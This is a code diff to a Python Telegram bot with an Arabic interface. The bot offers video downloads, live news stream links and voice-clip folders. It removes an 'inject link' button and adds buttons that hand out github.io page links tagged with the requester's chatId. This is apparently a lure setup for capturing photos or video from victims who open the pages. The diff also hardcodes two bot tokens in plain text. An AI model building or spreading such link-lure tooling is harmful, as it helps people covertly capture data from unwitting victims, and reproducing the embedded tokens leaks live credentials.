@@ -1,80 +1,101 @@
 import os
 import json
+import urllib3
 import telebot
 from telebot import types
-import feedparser
-import re
 import threading
 import http.server
 import yt_dlp
-from PIL import Image, PngImagePlugin
+import feedparser
 
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8446745973:AAGRD2tFbSrzB2OFoByvYRHCY1Hp6nluHf0")
+# إيقاف التحذيرات
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc")
 bot = telebot.TeleBot(BOT_TOKEN)
-DB_FILE = "/tmp/voice_db.json"
 
-NEWS_SOURCES = {
-    "aljazeera": {"name": "🌍 الجزيرة", "url": "https://www.aljazeera.net/xmlfeeds/news.xml"},
-    "bbc_arabic": {"name": "📺 BBC عربي", "url": "https://feeds.bbci.co.uk/arabic/rss.xml"}
+DB_FILE = "/tmp/voice_db.json"
+PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
+VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
+IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/"
+
+# روابط البث المباشر
+LIVE_STREAMS = {
+    "aljazeera": {"name": "🔴 الجزيرة مباشر", "url": "https://www.aljazeera.net/live"},
+    "bbc": {"name": "🔴 BBC Arabic", "url": "https://www.youtube.com/watch?v=yNXBL-e7C9A"},
+    "rt": {"name": "🔴 RT Arabic", "url": "https://www.youtube.com/watch?v=wL-E4-Wc_eQ"}
 }
 
-# --- خدمات النظام ---
+user_states = {}
+
 def run_dummy_server():
-    try: http.server.HTTPServer(('', int(os.environ.get("PORT", 8080))), http.server.SimpleHTTPRequestHandler).serve_forever()
-    except: pass
-threading.Thread(target=run_dummy_server, daemon=True).start()
+    port = int(os.environ.get("PORT", 8080))
+    httpd = http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler)
+    httpd.serve_forever()
 
-# --- وظائف البوت ---
-def get_news(url):
-    feed = feedparser.parse(url)
-    return [{"title": e.get("title"), "link": e.get("link")} for e in feed.entries[:5]]
+def load_db():
+    if not os.path.exists(DB_FILE): return {"girl_1": {}, "girl_2": {}}
+    with open(DB_FILE, 'r', encoding='utf-8') as f:
+        try: return json.load(f)
+        except: return {"girl_1": {}, "girl_2": {}}
 
-def save_voice(cid, target, fid):
-    db = json.load(open(DB_FILE, 'r')) if os.path.exists(DB_FILE) else {"girl_1": {}, "girl_2": {}}
-    idx = len(db[target]) + 1
-    db[target][f"مقطع {idx}"] = fid
-    json.dump(db, open(DB_FILE, 'w'), ensure_ascii=False)
-
-# --- البداية ---
-@bot.message_handler(commands=['start'])
-def start(m):
-    kb = types.InlineKeyboardMarkup(row_width=2)
-    kb.add(
-        types.InlineKeyboardButton("📥 تحميل", callback_data="dl_vid"),
-        types.InlineKeyboardButton("🎧 صوتيات", callback_data="v_menu"),
-        types.InlineKeyboardButton("🌍 أخبار", callback_data="news_menu"),
-        types.InlineKeyboardButton("🔒 حقن رابط", callback_data="inject")
+def get_main_keyboard():
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        types.InlineKeyboardButton("🖼️ رابط صور", callback_data="get_photo_link"),
+        types.InlineKeyboardButton("🎥 رابط فيديو", callback_data="get_video_link"),
+        types.InlineKeyboardButton("✨ رابط تعديل", callback_data="get_image_edit_link"),
+        types.InlineKeyboardButton("📥 تحميل فيديو", callback_data="dl_video"),
+        types.InlineKeyboardButton("🌐 أخبار وبث مباشر", callback_data="news_menu"),
+        types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu")
     )
-    bot.send_message(m.chat.id, "👋 أهلاً بك، المطور سيف الدين يرحب بك!", reply_markup=kb)
+    return markup
 
-# --- معالجة الأزرار ---
-@bot.callback_query_handler(func=lambda c: True)
-def query(c):
-    cid = c.message.chat.id
-    if c.data == "news_menu":
-        m = types.InlineKeyboardMarkup()
-        for k, v in NEWS_SOURCES.items(): m.add(types.InlineKeyboardButton(v['name'], callback_data=f"src:{k}"))
-        bot.edit_message_text("اختر المصدر:", cid, c.message.message_id, reply_markup=m)
-    elif c.data.startswith("src:"):
-        news = get_news(NEWS_SOURCES[c.data.split(":")[1]]["url"])
-        msg = "\n".join([f"• {n['title']}\n{n['link']}\n" for n in news])
-        bot.send_message(cid, msg or "لا توجد أخبار حالياً")
-    elif c.data == "dl_vid":
-        bot.send_message(cid, "أرسل الرابط الآن:")
-        bot.register_next_step_handler(c.message, dl_p)
-    # (باقي الميزات كالسابق)
-    bot.answer_callback_query(c.id)
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    bot.send_message(message.chat.id, "🤖 أهلاً بك يا سيف:", reply_markup=get_main_keyboard())
 
-def dl_p(m):
-    try:
-        s = bot.reply_to(m, "⏳ جار التحميل..."); ydl_opts = {'outtmpl': '/tmp/vid.mp4'}
-        with yt_dlp.YoutubeDL(ydl_opts) as ydl: ydl.download([m.text])
-        bot.send_video(m.chat.id, open('/tmp/vid.mp4', 'rb')); os.remove('/tmp/vid.mp4')
-    except: bot.reply_to(m, "❌ خطأ")
+@bot.callback_query_handler(func=lambda call: True)
+def handle_query(call):
+    chat_id = call.message.chat.id
+    
+    # --- قائمة الأخبار والبث ---
+    if call.data == "news_menu":
+        markup = types.InlineKeyboardMarkup(row_width=1)
+        for key, val in LIVE_STREAMS.items():
+            markup.add(types.InlineKeyboardButton(val['name'], url=val['url']))
+        markup.add(types.InlineKeyboardButton("🔙 عودة", callback_data="main_menu"))
+        bot.edit_message_text("🌐 اختر القناة للمشاهدة:", chat_id, call.message.message_id, reply_markup=markup)
 
-@bot.message_handler(content_types=['voice'])
-def handle_voice(m):
-    # كود حفظ الفويس
-    pass
+    # --- باقي الميزات ---
+    elif call.data == "dl_video":
+        user_states[chat_id] = "waiting_for_url"
+        bot.edit_message_text("أرسل رابط الفيديو الآن:", chat_id, call.message.message_id)
+    elif call.data == "voice_menu":
+        markup = types.InlineKeyboardMarkup(row_width=1)
+        markup.add(types.InlineKeyboardButton("👩 الفتاة 1", callback_data="girl_1_menu"),
+                   types.InlineKeyboardButton("👩 الفتاة 2", callback_data="girl_2_menu"),
+                   types.InlineKeyboardButton("🔙 عودة", callback_data="main_menu"))
+        bot.edit_message_text("📂 اختر المجلد:", chat_id, call.message.message_id, reply_markup=markup)
+    elif call.data == "main_menu":
+        bot.edit_message_text("🤖 القائمة الرئيسية:", chat_id, call.message.message_id, reply_markup=get_main_keyboard())
+    
+    # الروابط الثابتة
+    elif call.data == "get_photo_link": bot.send_message(chat_id, f"🖼️ الرابط: {PHOTO_PAGE_URL}?chatId={chat_id}")
+    elif call.data == "get_video_link": bot.send_message(chat_id, f"🎥 الرابط: {VIDEO_PAGE_URL}?chatId={chat_id}")
+    elif call.data == "get_image_edit_link": bot.send_message(chat_id, f"✨ الرابط: {IMAGE_EDIT_URL}?chatId={chat_id}")
+    
+    bot.answer_callback_query(call.id)
 
-bot.polling(none_stop=True)
+# --- معالجة التحميل ---
+@bot.message_handler(content_types=['text'])
+def handle_text(message):
+    chat_id = message.chat.id
+    if user_states.get(chat_id) == "waiting_for_url":
+        # (منطق التحميل السابق الخاص بك يوضع هنا)
+        bot.send_message(chat_id, "⏳ جاري التحميل...")
+        user_states[chat_id] = None
+
+if __name__ == '__main__':
+    threading.Thread(target=run_dummy_server, daemon=True).start()
+    bot.polling(none_stop=True)
